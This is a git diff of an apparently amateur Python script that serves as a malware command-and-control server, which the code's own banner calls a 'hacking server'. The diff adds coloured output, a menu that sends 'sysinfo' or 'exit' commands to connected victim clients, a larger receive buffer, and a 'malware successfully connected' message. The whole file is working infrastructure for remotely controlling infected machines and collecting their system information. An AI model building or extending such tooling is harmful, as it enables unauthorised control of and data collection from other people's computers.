@@ -7,6 +7,26 @@ import threading
 import time
 import random
 from _thread import *
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+def styled_print(message :str, color : bcolors) -> None:
+    """print message with color
+
+    Args:
+        message (str): message to print
+        color (str): color to print
+    Returns:
+        NONE
+    """
+    print(color+message+bcolors.ENDC)
 
 def create_server(ip :str, port :str) ->socket :
     """Create socket server
@@ -35,7 +55,7 @@ def recieve_data(connection: connection) -> json:
     Returns:
         json: readed data
     """
-    return connection.recv(2048).decode()
+    return connection.recv(100000).decode()
 
 
 #accept client connection
@@ -49,7 +69,6 @@ def accept_client(s :socket) -> connection:
         Coonection,address: Socket connection between client and server, client ip and port
     """
     connection, address = s.accept()
-    print('Connection from: ' + str(address))
    
     return connection,address
 #read json
@@ -97,8 +116,7 @@ def print_data(data : dict) -> None:
     for key in data:
         value=data[key]
         for key2 in value:
-            value2=value[key2]
-            print(value2)
+            styled_print(str(value[key2]),bcolors.OKBLUE)
 def input_data() -> dict:
     """input data
 
@@ -106,7 +124,14 @@ def input_data() -> dict:
         dict: input data
     """
     data={}
-    data["command"]=input("Enter command: ")
+    styled_print("What you want to do :) ? ",bcolors.OKGREEN)
+    styled_print("1) get info",bcolors.OKGREEN)
+    styled_print("2) exit",bcolors.OKGREEN)
+    user_input=input("Enter command: ")
+    if user_input=="1":
+        data["command"]="sysinfo"
+    elif user_input=="2":
+        data["command"]="exit"
     return data
 def accpet_client_data(connection : connection) -> None:
     """accept client data and send command to client
@@ -118,25 +143,38 @@ def accpet_client_data(connection : connection) -> None:
     """
     while True:
         try:
+            styled_print("malware succesfullt connected :))))))", bcolors.OKGREEN)
             input=input_data()
             input=json_convert(input)
             send_command(connection,input)
             data = recieve_data(connection)
             data = json_parser(data)
             print_data(data)
-            time.sleep(random.randint(1,10))
         except:           
             connection.close()
             break    
 
-#main
+def print_Title():
+    """Print title of app
+    """
+    styled_print("="*50+" Welcome to hacikng server "+"="*50,bcolors.OKGREEN)
+    styled_print("="*130,bcolors.FAIL)
+    styled_print("="*50+" Author : Mohammad choupan "+"="*50,bcolors.OKGREEN)
+    styled_print("="*130,bcolors.FAIL)
+    styled_print("="*50+" Waiting for connect client "+"="*50,bcolors.OKGREEN)
+    styled_print("="*130,bcolors.FAIL)
+
+
+
+
+
 if __name__== '__main__':
-    print("server started at port 45678")
-    server=create_server('0.0.0.0',45679)
+    print_Title()
+
+    server=create_server('0.0.0.0',45673)
     
     while True:
         connection,address=accept_client(server)        
-        # print_lock.acquire()
         start_new_thread(accpet_client_data, (connection,))
         
         
